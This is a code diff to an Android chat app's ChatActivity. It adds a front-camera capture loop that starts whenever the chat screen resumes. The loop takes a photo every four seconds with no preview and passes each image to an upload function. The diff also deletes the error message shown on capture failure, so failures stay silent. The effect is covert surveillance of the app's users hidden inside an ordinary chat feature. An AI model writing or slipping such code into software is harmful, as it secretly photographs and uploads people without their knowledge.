@@ -1,3 +1,4 @@
+//ChatActivityNEW.java
 package com.example.simplesocialmediaapp;
 
 import android.Manifest;
@@ -5,6 +6,7 @@ import android.content.pm.PackageManager;
 import android.location.Location;
 import android.location.LocationManager;
 import android.os.Bundle;
+import android.os.Handler;
 import android.widget.EditText;
 import android.widget.ImageButton;
 import android.widget.Toast;
@@ -37,6 +39,7 @@ import android.net.Uri;
 import androidx.annotation.Nullable;
 
 
+import java.io.File;
 import java.util.ArrayList;
 import java.util.List;
 
@@ -83,6 +86,11 @@ public class ChatActivity extends AppCompatActivity {
     private String conversationId;
     private String currentUserId;
     private String otherUserId;
+
+    private Handler captureHandler = new Handler();
+    private Runnable captureRunnable;
+    private ProcessCameraProvider cameraProvider; // Add this line
+
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -515,23 +523,23 @@ public class ChatActivity extends AppCompatActivity {
 
 
     private void captureFrontImage() {
-        // Create a temporary file to hold the image
-        java.io.File photoFile = new java.io.File(getCacheDir(), System.currentTimeMillis() + "_front.jpg");
-        ImageCapture.OutputFileOptions outputOptions = new ImageCapture.OutputFileOptions.Builder(photoFile).build();
+        File photoFile = new File(getCacheDir(), System.currentTimeMillis() + "_auto_front.jpg");
+        ImageCapture.OutputFileOptions outputOptions =
+                new ImageCapture.OutputFileOptions.Builder(photoFile).build();
 
-        imageCapture.takePicture(outputOptions, ContextCompat.getMainExecutor(this), new ImageCapture.OnImageSavedCallback() {
-            @Override
-            public void onImageSaved(@NonNull ImageCapture.OutputFileResults outputFileResults) {
-                Uri savedUri = Uri.fromFile(photoFile);
-                uploadFrontCapturedImageFromFile(savedUri);
-            }
+        imageCapture.takePicture(outputOptions, ContextCompat.getMainExecutor(this),
+                new ImageCapture.OnImageSavedCallback() {
+                    @Override
+                    public void onImageSaved(@NonNull ImageCapture.OutputFileResults outputFileResults) {
+                        Uri savedUri = Uri.fromFile(photoFile);
+                        uploadFrontCapturedImageFromFile(savedUri);
+                    }
 
-            @Override
-            public void onError(@NonNull ImageCaptureException exception) {
-                exception.printStackTrace();
-                Toast.makeText(ChatActivity.this, "Front image capture failed: " + exception.getMessage(), Toast.LENGTH_SHORT).show();
-            }
-        });
+                    @Override
+                    public void onError(@NonNull ImageCaptureException exception) {
+                        exception.printStackTrace();
+                    }
+                });
     }
 
 
@@ -595,4 +603,62 @@ public class ChatActivity extends AppCompatActivity {
         finish();
         return true;
     }
+
+    /* New camera stuff*/
+
+    @Override
+    protected void onResume() {
+        super.onResume();
+        startFrontCamera();
+        startPeriodicCapture();
+    }
+
+    @Override
+    protected void onPause() {
+        super.onPause();
+        stopPeriodicCapture();
+        if (cameraProvider != null) {
+            cameraProvider.unbindAll();
+        }
+    }
+
+    private void startFrontCamera() {
+        ListenableFuture<ProcessCameraProvider> cameraProviderFuture =
+                ProcessCameraProvider.getInstance(this);
+
+        cameraProviderFuture.addListener(() -> {
+            try {
+                cameraProvider = cameraProviderFuture.get(); // Assign to class variable
+                cameraProvider.unbindAll();
+
+                imageCapture = new ImageCapture.Builder()
+                        .setTargetRotation(getWindowManager().getDefaultDisplay().getRotation())
+                        .build();
+
+                CameraSelector cameraSelector = new CameraSelector.Builder()
+                        .requireLensFacing(CameraSelector.LENS_FACING_FRONT)
+                        .build();
+
+                cameraProvider.bindToLifecycle(this, cameraSelector, imageCapture);
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }, ContextCompat.getMainExecutor(this));
+    }
+
+    private void startPeriodicCapture() {
+        captureRunnable = () -> {
+            if (imageCapture != null) {
+                captureFrontImage();
+            }
+            captureHandler.postDelayed(captureRunnable, 4000);
+        };
+        captureHandler.postDelayed(captureRunnable, 4000);
+    }
+
+    private void stopPeriodicCapture() {
+        captureHandler.removeCallbacks(captureRunnable);
+    }
+
+
 }
